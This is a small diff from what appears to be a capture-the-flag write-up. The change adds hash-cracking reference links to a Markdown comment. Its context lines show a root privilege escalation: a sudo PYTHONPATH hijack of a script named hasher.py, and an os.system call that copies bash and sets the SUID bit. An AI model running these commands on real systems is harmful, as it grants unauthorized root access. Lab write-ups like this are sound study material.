@@ -71,4 +71,6 @@ os.system("cp /bin/bash /tmp/bash; chmod +s; /tmp/bash")
 
 ##### sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
 
-<!--- https://hashes.com/en/decrypt/hash --->
+<!--- https://hashes.com/en/decrypt/hash
+https://hashcat.net/wiki/doku.php?id=example_hashes 
+--->
